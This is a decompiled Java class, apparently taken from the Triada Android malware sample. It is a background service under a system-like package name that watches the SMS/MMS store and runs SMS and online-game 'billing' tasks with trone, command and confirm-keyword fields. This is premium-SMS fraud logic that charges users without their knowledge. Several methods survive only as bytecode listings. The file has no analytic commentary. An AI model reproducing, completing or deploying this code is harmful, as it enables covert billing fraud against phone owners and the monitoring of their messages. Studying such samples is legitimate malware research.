package com.android.essdk.eyou;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import com.android.essdk.eyou.a.a;
import com.android.essdk.eyou.a.h;
import com.android.essdk.eyou.c.a;
import com.android.essdk.eyou.e.b;
import com.android.essdk.eyou.sms.a;
import com.android.essdk.eyou.sms.a.c;
import java.util.Iterator;
import java.util.List;

public class PlateService extends Service {
  private static boolean f;
  
  private Handler a = null;
  
  private c b = null;
  
  private PlateService$MyServiceReceiver c;
  
  private List d;
  
  private List e;
  
  private void a() {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: iconst_0
    //   3: putstatic com/android/essdk/eyou/PlateService.f : Z
    //   6: aload_0
    //   7: getfield b : Lcom/android/essdk/eyou/sms/a/c;
    //   10: invokevirtual a : ()Lcom/android/essdk/eyou/sms/a/a;
    //   13: invokevirtual a : ()V
    //   16: aload_0
    //   17: invokestatic a : ()Lcom/android/essdk/eyou/b/d;
    //   20: aload_0
    //   21: invokevirtual a : (Landroid/content/Context;)Ljava/util/List;
    //   24: putfield d : Ljava/util/List;
    //   27: aload_0
    //   28: invokestatic a : ()Lcom/android/essdk/eyou/b/c;
    //   31: aload_0
    //   32: invokevirtual a : (Landroid/content/Context;)Ljava/util/List;
    //   35: putfield e : Ljava/util/List;
    //   38: aload_0
    //   39: aload_0
    //   40: invokespecial a : (Landroid/content/Context;)V
    //   43: aload_0
    //   44: invokespecial c : ()V
    //   47: aload_0
    //   48: invokespecial b : ()V
    //   51: aload_0
    //   52: monitorexit
    //   53: return
    //   54: astore_1
    //   55: aload_0
    //   56: monitorexit
    //   57: aload_1
    //   58: athrow
    // Exception table:
    //   from	to	target	type
    //   2	51	54	finally
  }
  
  private void a(Context paramContext) {
    // Byte code:
    //   0: aload_0
    //   1: getfield e : Ljava/util/List;
    //   4: ifnull -> 38
    //   7: aload_0
    //   8: getfield e : Ljava/util/List;
    //   11: invokeinterface size : ()I
    //   16: ifle -> 38
    //   19: iconst_0
    //   20: istore_2
    //   21: iload_2
    //   22: ifeq -> 37
    //   25: ldc 'PlateService'
    //   27: ldc '没有ANDROID网游和彩信计费，直接恢复网络'
    //   29: invokestatic b : (Ljava/lang/String;Ljava/lang/String;)I
    //   32: pop
    //   33: aload_1
    //   34: invokestatic c : (Landroid/content/Context;)V
    //   37: return
    //   38: aload_0
    //   39: getfield d : Ljava/util/List;
    //   42: ifnull -> 76
    //   45: aload_0
    //   46: getfield d : Ljava/util/List;
    //   49: invokeinterface size : ()I
    //   54: ifle -> 76
    //   57: aload_0
    //   58: getfield d : Ljava/util/List;
    //   61: invokeinterface iterator : ()Ljava/util/Iterator;
    //   66: astore_3
    //   67: aload_3
    //   68: invokeinterface hasNext : ()Z
    //   73: ifne -> 81
    //   76: iconst_1
    //   77: istore_2
    //   78: goto -> 21
    //   81: aload_3
    //   82: invokeinterface next : ()Ljava/lang/Object;
    //   87: checkcast com/android/essdk/eyou/a/h
    //   90: invokevirtual e : ()Z
    //   93: ifne -> 67
    //   96: iconst_0
    //   97: istore_2
    //   98: goto -> 21
  }
  
  private void a(List paramList) {
    Iterator<h> iterator = paramList.iterator();
    while (true) {
      if (!iterator.hasNext())
        return; 
      h h = iterator.next();
      Log.e("showSMSTaskInfo", "SMSTaskInfo id=" + h.d() + " feeTimes=" + h.n() + " trone=" + h.g() + " command=" + h.f() + " confirmKeyword=" + h.j() + " confirmTrone=" + h.i() + " confirmCommand=");
    } 
  }
  
  private void b() {
    if (!a.d) {
      b.b("PlateService", "处理ANDROID网游计费");
      (new a((Context)this)).a(this.e);
    } 
  }
  
  private void c() {
    if (!a.b) {
      b.b("PlateService", "处理短信计费");
      a(this.d);
      a a = new a((Context)this, this.d);
      if (this.d != null) {
        b.b("PlateService", "短信计费生成");
        a.a();
      } 
      this.b.a().b();
    } 
  }
  
  private void d() {
    this.a = new k(this);
  }
  
  private void e() {
    this.b = c.a(this.a);
    this.b.a((Context)this);
    getContentResolver().registerContentObserver(Uri.parse("content://mms-sms"), true, (ContentObserver)this.b);
  }
  
  protected void finalize() {
    if (this.c != null)
      unregisterReceiver(this.c); 
    super.finalize();
  }
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public void onCreate() {
    super.onCreate();
    d();
    e();
  }
  
  public void onDestroy() {
    super.onDestroy();
  }
  
  public void onStart(Intent paramIntent, int paramInt) {
    super.onStart(paramIntent, paramInt);
    b.c("epay_log", "fee service start！");
    if (!f) {
      (new j(this)).execute((Object[])new String[] { "" });
      if (!a.a && !a.b)
        boolean bool = a.d; 
      IntentFilter intentFilter = new IntentFilter("easou.pay.sms.send");
      this.c = new PlateService$MyServiceReceiver(this);
      registerReceiver(this.c, intentFilter);
    } 
  }
}


/* Location:              /home/fahim/Desktop/triada1-dex2jar.jar!/com/android/essdk/eyou/PlateService.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */